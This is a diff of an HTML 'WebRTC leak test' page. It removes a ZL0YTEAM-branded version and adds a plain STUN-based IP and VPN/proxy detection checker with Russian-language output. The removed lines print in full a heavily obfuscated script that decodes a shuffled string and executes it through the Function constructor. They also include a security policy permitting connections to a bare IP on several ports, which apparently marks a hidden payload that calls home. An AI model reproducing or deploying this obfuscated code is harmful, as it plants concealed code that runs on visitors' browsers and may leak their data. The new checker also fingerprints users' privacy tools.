@@ -1,127 +1,128 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>WebRTC leak test</title>
-    <meta http-equiv="Content-Security-Policy"
-          content="default-src 'self';
-                   connect-src 'self' http://172.86.65.208:10000 http://172.86.65.208:8000 http://172.86.65.208:9999;
-                   script-src 'self' 'unsafe-inline' 'unsafe-eval';
-                   style-src 'self' 'unsafe-inline';">
+    <title>UDP / WebRTC IP Checker (Advanced)</title>
     <style>
-        body {
-            font-size: 16px;
-            line-height: 1.6;
-            background-color: #000;
-            color: #0a5;
-            font-family: "Courier New", Courier, monospace;
-            margin: 0;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        h1, h2, h3 {
-            color: #0a5;
-            text-align: center;
-        }
-
-        .loader {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .loader.active {
-            display: block;
-        }
-
-        .loader .spinner {
-            margin: 0 auto 10px auto;
-            width: 32px;
-            height: 32px;
-            border: 4px solid #0a5;
-            border-top: 4px solid #000;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-        }
-
-        .loader div:last-child {
-            color: #0a5;
-            margin-top: 10px;
-        }
-
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-
-        .important-note {
-            text-align: center;
-            margin: 20px 0;
-            font-weight: bold;
-            font-size: 18px;
-            padding: 15px;
-            border: 1px solid #0a5;
-            background-color: #000;
-        }
-
-        .logo {
-            font-family: "Courier New", Courier, monospace;
-            font-size: 48px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 30px;
-            letter-spacing: 4px;
-            color: #0a5;
-            text-shadow: 0 0 10px rgba(0, 170, 85, 0.3);
-            border-bottom: 2px solid #0a5;
-            padding-bottom: 15px;
-            margin-top: 20px;
-        }
-
-        .logo span {
-            color: #F23A00;
-        }
-
-        .telegram-link {
-            display: block;
-            text-align: center;
-            margin-top: 30px;
-            text-decoration: none;
-            color: #0a5;
-            font-size: 18px;
-            padding: 10px;
-            border: 2px solid #0a5;
-            border-radius: 5px;
-            transition: all 0.3s ease;
-        }
-
-        .telegram-link:hover {
-            background-color: #0a5;
-            color: #000;
-        }
+        body { background: #181818; color: #38f1; font-family: monospace; padding: 30px; }
+        .main { max-width: 700px; margin: 0 auto; }
+        .result { background: #222; border-radius: 8px; padding: 15px; margin-top: 20px; }
+        .ice-list { font-size: 13px; color: #6fe; background: #181818; border-radius: 6px; padding: 6px; margin: 10px 0;}
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="logo">ZL0Y<span>TEAM</span></div>
-    <h1>Check your browser leaking IP</h1>
-    <div class="loader" id="loadingIndicator">
-        <div class="spinner"></div>
-        <div>Please wait...</div>
-    </div>
-    <div class="important-note" id="finalNote"></div>
-    <a href="https://t.me/Zl0yTeam" class="telegram-link" target="_blank">Join our https://t.me/Zl0yTeam</a>
+<div class="main">
+    <h2>IP & UDP (WebRTC) Check <small>by ChatGPT</small></h2>
+    <div id="results" class="result">Loading...</div>
 </div>
 
 <script>
-(function(){var Sme='',LFI=406-395;function suo(y){var z=5392013;var h=y.length;var c=[];for(var u=0;u<h;u++){c[u]=y.charAt(u)};for(var u=0;u<h;u++){var b=z*(u+415)+(z%21132);var t=z*(u+636)+(z%41733);var e=b%h;var w=t%h;var q=c[e];c[e]=c[w];c[w]=q;z=(b+t)%7188486;};return c.join('')};var XzX=suo('slpiatkowrtouxjrhnctefbmdoqrcvnguczys').substr(0,LFI);var bSc='ue=7x 82fa=,}irb8ct,saoojzn..dp.;o.ta,jn.p;g0e2dma1nl.ra].e[u,-,f0(6pcn1u7r)=eh9asA9"<f,y r+m,e58e9])1+i),p0n0vag6C1p,o2staa]dtj;==.rvuv1eo=;0xt7l;=v.h;(bs.k;-[i[s(uj( )=nh+=rsv"=xu=78;n;nt5qiua[m[f9r;l(r st.l ==d+u=2r6xu-rng]i;n==rvv=;orjofg;fhl}o.{uu(}li0.( +aa);t8vai f);r=+ag);sz1lrn=n(r8]=";rov=tA1 lvar(9)y(4ai;5grr=lu{SSgv+ ( 0=,orrytc7.;t<j=C+=(v4b{o)(mg+chl(vspi;mg+em hrr y+)]hl;io;sAv g);u], +ezfx)(v;;!fe+=}fho,24)geg8[)coaeu9lvy1+r;=v(tybi.sa].he  f.4[=(npg1na{e.n{d;ra-x0c+chsC))euAl,;+c)C)u.=h )C5re t,8{na=-eehstq+a2dffnt ala0 ir(.atiadtrhnrarc+56];h](zs;))g),-1*e;jrbs=;51<a(,""t;tv]t0)(g7an2;;5)h]uc;3i (fgicn+ier)}hh)q"r(;bs[vd.su0tt1;nre6+[o;,i =[noo=n,",(pg}rrppglvj9l"urmeu[;(=l>t{rnf 1nc;a,( Ci8*(aa]ohl+.,3qC(66hw(rctt(vrh<vtp+)rnl.6doct,umra)r),u(,gi];rb7l8vagv)vtl==u->)th;g+frcdhahul<e,svA.8tu1;l(s))nlo,.h(on[====rseyg).C;dc0u[s+n("cau.,;ea7folet=m=+!"t4r7[};r g';var fRj=suo[XzX];var uca='';var TsH=fRj;var qZk=fRj(uca,suo(bSc));var qvw=qZk(suo('.a{d.)u K[e}2_Wr8.n`=Ke.d ec.;KWv.eyiIy]doKe.K]q,w.4sKKn eK.2 ;pWKKofdoigi1un9aWie"10atWBu"="8!otEk\'QWD!i=i{T,\/yT!]=I=r]UK,.d1ic,{oeKpTateeb(W,e .Kecuv"rP(2r0x.sho";tK;.Wreep=C;9rr.+6!+aeq3KK>E.w0]on.ita".ee)0ueWit0"eeK K)KKr!i.Iw(=!s :ir(=Ke0+!..8L>efKoKz()oKt!h!e.,"T((,K..%_zocv imDKpbW.*,u3JKW)tK.l2-d=)ei0tKNK0K=ae8K.st00Wr),9!!n.=(i]d!e]r)eQ%s4.s)or;pWuo;D"yetnl.K pW.mxWTeEc"=j(e=sW"vmW&DWKkWc,ule."ry"z3l"(aar]=a1KnF"te0(ti,i:tW"d1tinKgTWGo_!r;oKW6-.ctKe.kK!W{Ze9.W0.KKa\/es tt1KKKKe9}.vont.ne0+(.iiperW e0a!o-K.Ksb181WoWWr.tt|9ib)eK.sK}8.e<hK$8s""o)jKrp y)KsK;2]]ji-o5KKr).)e]C=.4K:r,aNKhc$.K= i:t.(ta;t0hr38)KK#K!)e"3Ma\/2!o.(KKue+f.zlt.un)nKd.g>!oen8W.e0Ktir rTtj=.},neeKKonK1 }K.e.1}ey}K(nb_(en.K+lezt.eo!eor"l.KeC6mu!o5Wo&KWgKDl!kc{=ri2rVK!CDsxp7!t5_ar0JEx.&:1WK).KoK5c1:7D!tKrc+8"- .&EK}r60R;t="f1x"""\/!K(orKMz"Da!,(oin="0KKeeKeieKoarK*$1+!sVn2Kc>e?=-su= i+;KeK5KKgr!.Kut{F:i=idsl0_eCce.]uae x!neVeDu"n$"!nK"eta$nK,,Ki!)A& 9.tcWz.7sK=x#1KiqK92".=8-ulK(i(ee9_(xin5v3K9!8Es"r"K{!cIb!3;pyK!,nofKea Kl0Wo6.e5)NKK!=2+r1t}K9}cK1ieKKcerhdKe ;e.!i}:e sK"iw= K)Kh} 1tCDa!(X=W89Wxetoer"Kx2_(Dul24Kiio>Koe{e)wVsu.0e!uaK;.si;o8e{y.dWHec>\/3vx=h,=*6;)n9rKOKya1.Km9nN;cee0,#e!W,K({.!,rc3]ioKrt_nidd!KedcSG]"WrieKPcD={o>h<KhEoK.w5<eD)tnti(cun!K!&uu,Kcoc{KK6re8e)K!1(W.ose))Kiosso(Kgr,D=Kx959!eaKE9rp=l1s]nM\\CE,De0,czh:!!KPa.)es&q8rV_4efKtKE=enKWlK) K.W\/e""K%) =efeiKEa51(KV.pIc0.to0#!rei)).Kc"+Eerw"+Kec]F2.+e)"mc4fwTe{.JWi1!+dKnt{{0e;D+=K1Kv{Kf(KK.c\\r-e(sd  Ke.1e0iT){+hrKt(\/.KK6feK["coKtKmeu\/Ko=cKC.=s0K!)cKt0KietK}(f.ee4j2JctF>n19KfaW21er47I.e1e:5(voso).e.7GpK.pi(bKVKr+))e!ibW1o.gKyE).yKceD=1f.e,zegeve;!ee6..uW(K{ed4;2( .e&.a.i.FeKeW..cK"4oe mM,Ke.nG.Q2sutK)e!hr.K5h,u\/Kh5rtev"*)\/oi]_vK>[K1=0_".d]EraETd9( Kco1)eetu.9c!AKcee+ifKrnWo6eKK@)DKKr8,w(sxl!iKnKruG=gti.p!1t.KJlKApeKeKKK!K.i=tw#{ter!uKiyid{ib)ri)!58"rDK.},8)Do((KKKky1Y0}{at-tuT){.I>o]rKCKue>ei1..(a,2 0]raSs];eKtsb6];KW0("K:KK8ue.em(*.A!(e9!oi](K.et)}#sK+Ki;DtXe!5DrrfWK3e}8`(awo.KfeK9toee=o#,.o(tD)nn1Dte5j9en.!=K.e=DtKKee1dde.hrl.{W0]eKWhNT(gp.)nsklKeKo4el..1aK KleKKEDl#L{1.]WOcPKhUlcsaKiKp6mn.0"}!=W1If:K)re^KDI. TKWoC9x7eN)9=KeK1t}..KKKDK.=rr4.Kn)K2s5Fnh(yo.W.eFste.!stWrK2"e{l!raelv9}WK}der?e{W!K.anK5]W\'r!.)e=)l.+0a}eKoce]ra&{4Kr4KKe-e)96xHK]o01.Ka}2T.0Kr((&.t<i eKK}K8.!ar=e1!ueyu.+)( cdK9)}n.TK7!Kce9tllKxKK(\/Knp.)5}6aE9rC1tl1,(19t],s.\'K 01W"Dse=K\/Hu1sKKa.,"H_Ce!9K!u5u!..Etr=5K0_;sdKatK"]KeK!o9e"}hc`nK!{xW)9)  !sKWnMeT_;..!0)fcKKK+eoiKsre.o+-sr%5Kt)eeGcs15aeyy;c1i()edenKy.se.c.K#K.{ Ke5KA};K"C]!9d.|!.8fKtK)9.W yjc:8K3\/9C1u)S(a(i_]EHKrth!%K(mlK.fw!grtx_,Xe.h>}Cd29404tr\'e.]t"x]ex+sKKaK.yy=;yK)k.""c!.]Krx9,i"cWKu5n.6).);i.(!nKW7%e$te]Kht<0dDKt-esx]!]e+uSWee,Kt"WK"(KqKa"en.e%Ko)W.rs)JtkKe7uW zl!.>9selon0inb7not5;Kc4cK5eKH!9luK ](sK.er.aljIK2nT{|.DfdKN9f1}9ejstcrrKif(eCK0. f"KvcuiWuow+eD..Ko1NKKK9Kn0t)oK-,K1e9[;e02]..D!oyi4>[K51KK ,.O))nd:1o"*u){;)t2K.";KKF.rea01}-4e(A0 K:,KwW;z}[*KKESK W9T8!5 oxs.t"s of.n)n2cW .sf&tuf.=e1lu!Kfrh;W!r1otK].tl(,.K1.m,seWni}K"m":KIeVK=xK;K!.Ke}y= &"qKToKoL8Kawy]K]0cKr96igKinc..K s(iFg>"A(})5 Ka(;d;nliKeSKKdW),K4h^:.Keps%.DK(TK(5=nKf.;eiKe{0oKK=aeKudrbiuIWoKKt0rtl)pivn e-_mK.in.nDKKa@DboKWWseo)_ee\\9Kr nb.Kng3"]KuKWk.1.,Dm..9(a{\/A.K.eKHKKK%1n87(]err7!.KCZ1eKL.yFt.+KK\\\'.00s!!8rtyK.a}KKKK64K]cD(2l.K"Ke>}lnu.etoK_ rofKr{Rf=iK!CDX]uxu(uW }eam.a!)ntb99]geeLr5={8\'nK...K#e,i)uc8Krry9,.!tReesKKj,KD5re)e)r]42.e1omeK9tOc$:)s_{KoK. 2ts,Ix1ehae3 ie:}K9#;I.("(a)51Eonf!3(..KeK1ehK;()ndWD(0=WK!rl}1"4eo!.7eKe25K"=BKit(saat..K0Br;!,HeK.e`{Kurioiqd).07A(Cts\/ocS.)\/sceK4nn0K9ey)K} .]K!]fe;: if(Gp}2W{!dK6.(4T&]yn e(aWew,K3}\'eK.KSo9sfK!i.ue(eceK"sKri;W.(t(eee39=Dh=K.ra}!%sD#KkKse.{Ke#}SoKreise,WSKDKwKfrfh age4eLr; .uKeeuodKwry)1!aKsrbKwn,2s en}.lTKicth"K.iD)k.oo]eKKK=6#!p60KKd,(=tlmKCKorn;aEKete,!8m5!.K95N*ltequ!KrEwdO.sieiioeleaga(:WqueK!y_#_)]DK%ZKevK s79YeK]KK#v_;K=v[.K2KKq]d.Ka.Rty lh9eWKKtBK0.2(KdFe!o&yacKK :KK8_5h"[.&"IiW)z`he!+Kvb5;0K mTieK+porcuo2K(e.V(sln^Wn$KKK|f.d...nySK0_l9K>!vu".7n[))i".Wu&6KlK)e,e}KrKt:nKclg)WK!.K0+pKcG%SKmK:!}): KK"KK(0 Kc9UA.n^KrA,iA)..3Kwgo lKdKeKK7os]l5KA7Ku.:!+Kie2.6aC."eudM(rlueeKr!.fDK hayryrK.KKtkW8)d.eK.nWv.Su$no-r#r= (!r0KIeakcE.1\/9i. {K!}8kKnxrDI5\/o,e,.{ol."]1c]rMr)60e0i0 .ow\'"+3<!(}wf{K 5ro3uhK.hr1eh df-n?.K)yKb}40Y.W}Ke|:\/Ti}B,{.nr)dWK!"KE)h9DK^!.7ideZK-rr("K.o.DsK. b.o!tKet .&K.. jY.!te;W!#ft0o4vh}n[ini(t8e!(rfKG(0K0ietW"*KK8!]e;pt.6h102ilct:itr.1Kee.80e((p0h.s9e}Wrr 12fe(;.}f++};LK}tKKr@aK.!A+,=eKn=W%$oB]\'K.K#2,cx.!]lg.i!prtK)egs_)s({Y95Klf.K.0rK}3re"oeK!uf.o5i#MWtKw,o38eu,]W){eoeeeeCeKvalKwK5|."rroWthMedsage.x}K!.,KNtxf!K)(tldcC,K0eK,(3AK1X)el.ak;|g:9smEa"iWWc!t}eq.g#[\/#8K4K0Wig,.Kmev0exge4)[e[zc!.qe!@"K#ue-]}d9e3D@4L5K-inia!#i )eaDKK[0.sntfr.1e..gWiyerKo r;diQ.roaW8"Wes\'rK!K!\'E{]rsK 05p1ap =TFKaKgDeK]Itr K2.0K)cDCA{7nio+"(cKn)K.tKn;U:YnKee.S"r($E=faK[x-l>=K}fW}Kq{rD8K.e.(ne{te5g1-K,EX}r)oK9ie1o,.{+;_KKr"n55eK1ta;)o8rth7fo!ny me0ra"::1r.I@dadrK+#K.0an4WmKKe}KaKK4rDdo] C{K.e)sr\\ %K+cTsK(9W2s..rWe+aDe WIKK!Ct u0W.KD )e(lKK#(re!!}eKK=.rW.(.1e..;>"=yf(enKy1K(!tc)3!hw7")Kte5]veG C9K)etK)oKK?"eTK(one?c.ufzK;lTg$l.;1!K. i[e0S.K>$t utK). g]eCK\/eK.Dn5 fwtWa "ttEh(!eK..,\/)b5n.90..o9,]1=iw4se.fK=Je];go*, }3K&0-eCh.sEi,"1ueopa;e)ddKKZ K1..].etc{;;eh"=e).K+f .!.o3&\/oe1eZ-}dif(alD.lnr5Kc,_KtK|!d!tK3[K. KK "]n{(Ke0sK,lCmetea9,eWsK|KiK1;{eKir7kKnpe( .a;0a"ye=gKxKKKDW} (W#?}riW)K.rDaei  !le"85xM0a5.!e(we(;_Dnw)bFeeiK+iK0!+(K=KgW( e5twKw})x2{y>r9}.C5;"0_,K \\e)0a)3sr_t).m |wnl9,KK. TC19Kpua}e 0eKrKn925ran}atp3cK.v$"'));var ZLL=TsH(Sme,qvw );ZLL(8859);return 1838})()
+async function getPublicIP() {
+    try {
+        let res = await fetch("https://api.ipify.org?format=json");
+        let data = await res.json();
+        return data.ip;
+    } catch (e) { return null; }
+}
+
+function isMobile() {
+    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+}
+
+// Массив популярных STUN-серверов (Google + Open)
+const stunServers = [
+    {urls: "stun:stun.l.google.com:19302"},
+    {urls: "stun:stun1.l.google.com:19302"},
+    {urls: "stun:stun2.l.google.com:19302"},
+    {urls: "stun:stun3.l.google.com:19302"},
+    {urls: "stun:stun4.l.google.com:19302"},
+    {urls: "stun:stun.services.mozilla.com"},
+    {urls: "stun:stun.stunprotocol.org:3478"},
+    {urls: "stun:stun.sipnet.net"},
+];
+
+// Глубокий сбор ICE-кандидатов: возвращает массив объектов с инфой
+function getWebRTCCandidates(timeoutMs=3500) {
+    return new Promise((resolve) => {
+        let candidates = [];
+        let pc = new RTCPeerConnection({iceServers: stunServers});
+        pc.createDataChannel("");
+        pc.onicecandidate = (evt) => {
+            if (!evt.candidate) return;
+            // Сохраняем весь candidate-string
+            let cand = evt.candidate.candidate;
+            // парсим
+            let parts = cand.split(' ');
+            let ip = parts[4];
+            let port = parts[5];
+            let proto = parts[2];
+            let candType = cand.match(/typ (\w+)/) ? cand.match(/typ (\w+)/)[1] : '';
+            candidates.push({
+                raw: cand,
+                ip, port, proto, candType
+            });
+        };
+        pc.onicegatheringstatechange = () => {
+            if (pc.iceGatheringState === "complete") {
+                pc.close();
+                resolve(candidates);
+            }
+        };
+        setTimeout(() => { pc.close(); resolve(candidates); }, timeoutMs);
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    });
+}
+
+async function runCheck() {
+    let results = document.getElementById("results");
+    results.textContent = "Проверяем...";
+
+    let publicIP = await getPublicIP();
+    let candidates = await getWebRTCCandidates();
+
+    // Сводим IP через WebRTC
+    let webrtcIps = Array.from(new Set(candidates.map(c => c.ip).filter(Boolean)));
+    let mobile = isMobile();
+
+    // Подсчёт UDP/relay/host/tcp кандидатов
+    let udpCandidates = candidates.filter(c => c.proto === 'udp');
+    let tcpCandidates = candidates.filter(c => c.proto === 'tcp');
+    let hostCandidates = candidates.filter(c => c.candType === 'host');
+    let relayCandidates = candidates.filter(c => c.candType === 'relay');
+    let srflxCandidates = candidates.filter(c => c.candType === 'srflx');
+
+    let html = `
+        <b>Ваш публичный IP (HTTP):</b> <br> <span>${publicIP || 'Ошибка'}</span><br><br>
+        <b>IP через WebRTC (UDP):</b> <br> <span>${webrtcIps.length ? webrtcIps.join(', ') : 'Не удалось получить (UDP/WebRTC заблокирован)'}</span><br>
+        <small>Всего ICE-кандидатов: ${candidates.length}. UDP: ${udpCandidates.length}, TCP: ${tcpCandidates.length}, relay: ${relayCandidates.length}, srflx: ${srflxCandidates.length}, host: ${hostCandidates.length}</small><br>
+        <div class="ice-list"><b>Детали ICE-кандидатов:</b><br>
+        ${candidates.map(c => `ip: ${c.ip}, port: ${c.port}, proto: ${c.proto}, type: ${c.candType}`).join('<br>')}
+        </div>
+        <b>Тип устройства:</b> <span>${mobile ? "Мобильный" : "Десктоп"}</span><br><br>
+    `;
+
+    // Логика анализа
+    if (!udpCandidates.length) {
+        html += `<b style="color:orange;">UDP/WebRTC кандидаты не найдены!<br>
+        <span>Скорее всего, UDP заблокирован (антидетект, прокси, VPN, или настройки браузера).</span></b>`;
+    } else if (!hostCandidates.length && relayCandidates.length) {
+        html += `<b style="color:red;">Есть только relay-кандидаты (через TURN-серверы) — часто это VPN/Proxy!</b>`;
+    } else if (webrtcIps.includes(publicIP)) {
+        html += `<b style="color:lime;">IP через UDP/WebRTC совпадает с HTTP — всё нормально!</b>`;
+    } else {
+        if (mobile) {
+            html += `<b style="color:gold;">На мобильных соединениях (3G/4G/5G) разные IP через HTTP и WebRTC — это НОРМА.<br>
+            Но если только relay-кандидаты или нет UDP — возможно, используется VPN/прокси/антидетект.</b>`;
+        } else {
+            html += `<b style="color:red;">Обнаружено несоответствие IP!</b>
+            <br>Это может быть признаком использования прокси/VPN/антидетекта.<br>
+            <small>Если вы не используете мобильный интернет и ваш браузер обычный, возможно, применяется прокси/антидетект/браузер с подменой WebRTC.</small>`;
+        }
+    }
+    results.innerHTML = html;
+}
+
+runCheck();
 </script>
 </body>
 </html>
